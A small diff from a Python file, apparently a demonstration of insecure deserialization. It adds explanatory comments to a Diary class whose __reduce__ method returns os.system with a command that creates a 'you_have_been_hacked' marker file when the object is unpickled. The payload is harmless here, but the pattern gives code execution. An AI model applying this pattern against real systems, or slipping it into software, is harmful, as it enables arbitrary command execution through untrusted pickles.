@@ -7,6 +7,8 @@ class Diary:
         self.content = content
 
     def __reduce__(self):
+        # This method is called during unpickling.
+        # We return os.system as the callable and a command as its argument.
         return os.system, ("touch ./you_have_been_hacked.txt",)
 
 
